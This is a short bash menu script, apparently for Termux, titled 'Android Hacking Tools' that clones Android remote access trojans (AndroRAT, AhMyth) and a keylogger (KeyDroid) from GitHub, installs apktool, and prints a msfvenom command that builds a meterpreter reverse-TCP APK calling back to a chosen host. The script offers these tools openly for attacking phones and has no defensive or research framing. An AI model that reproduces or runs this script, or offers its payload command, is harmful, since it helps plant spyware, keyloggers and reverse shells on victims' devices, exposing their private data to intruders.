#!/bin/bash
clear
echo -e "\e[1;36m[ Android Hacking Tools ]\e[0m"
echo -e "\e[1;34mAnalyze, exploit, and generate payloads for Android devices.\e[0m"
echo
echo -e "\e[1;32m[1] AndroRat\e[0m        - Remote Access Trojan for Android"
echo -e "\e[1;32m[2] AhMyth\e[0m          - Android RAT with GUI (use on PC recommended)"
echo -e "\e[1;32m[3] Metasploit Payload\e[0m - Generate APK reverse shell"
echo -e "\e[1;32m[4] Apktool\e[0m         - Decompile & recompile APKs"
echo -e "\e[1;32m[5] KeyDroid\e[0m        - Keylogger for Android (experimental)"
echo -e "\e[1;33m[0] Back\e[0m"
echo
read -p "Choose a tool to install or generate: " android_choice

case $android_choice in
    1)
        git clone https://github.com/karma9874/AndroRAT
        echo -e "\e[1;34m[+] Cloned to AndroRAT/. Run with: cd AndroRAT && bash start.sh\e[0m"
        ;;
    2)
        git clone https://github.com/AhMyth/AhMyth-Android-RAT
        echo -e "\e[1;34m[!] GUI tool. Recommended on PC with Electron support.\e[0m"
        ;;
    3)
        echo -e "\n\e[1;34mSample command:\e[0m"
        echo -e "msfvenom -p android/meterpreter/reverse_tcp LHOST=your_ip LPORT=4444 -o payload.apk"
        ;;
    4)
        pkg install apktool -y
        echo -e "\e[1;32m[+] Apktool installed. Use: apktool d app.apk\e[0m"
        ;;
    5)
        git clone https://github.com/RetroGameCoder/KeyDroid
        echo -e "\e[1;34m[+] Cloned to KeyDroid/. Follow README for setup.\e[0m"
        ;;
    0) exit ;;
    *) echo -e "\e[1;31mInvalid choice.\e[0m" ;;
esac
